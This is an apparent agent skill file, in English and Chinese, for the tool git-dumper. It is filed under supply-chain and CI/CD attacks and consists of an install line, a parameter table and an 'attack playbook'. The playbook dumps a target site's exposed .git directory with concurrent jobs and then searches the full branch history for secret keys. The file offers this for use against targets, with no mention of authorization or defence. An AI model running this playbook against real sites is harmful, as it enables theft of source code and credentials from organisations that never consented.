---
name: git-dumper-repo
description: "git-dumper recovers exposed .git repositories without directory listing. Signals: supply chain, CI/CD, download and restore repository, concurrency, aggressive scan mode."
zh-signals: "git-dumper: 无目录列表的 .git 还原。信号:供应链,cicd,下载并还原仓库,并发,强扫模式。"
---

# git-dumper

- 攻击大类:C12 供应链与CI/CD攻击
- 上游仓库:https://github.com/arthaud/git-dumper
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
pip install git-dumper
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `git-dumper https://t.com/.git/ ./repo` | 下载并还原仓库 |
| `--jobs 10` | 并发 |
| `--brute` | 强扫模式 |

## 攻击场景 Playbook

### 无目录列表的 .git 还原

```bash
git-dumper --jobs 20 https://target.com/.git/ leaked
cd leaked && git log --all --oneline  # 全分支历史挖掘密钥
```

## 注意事项

智能猜测 .git 对象文件名,无需目录列表;与 dvcs-ripper 互补。
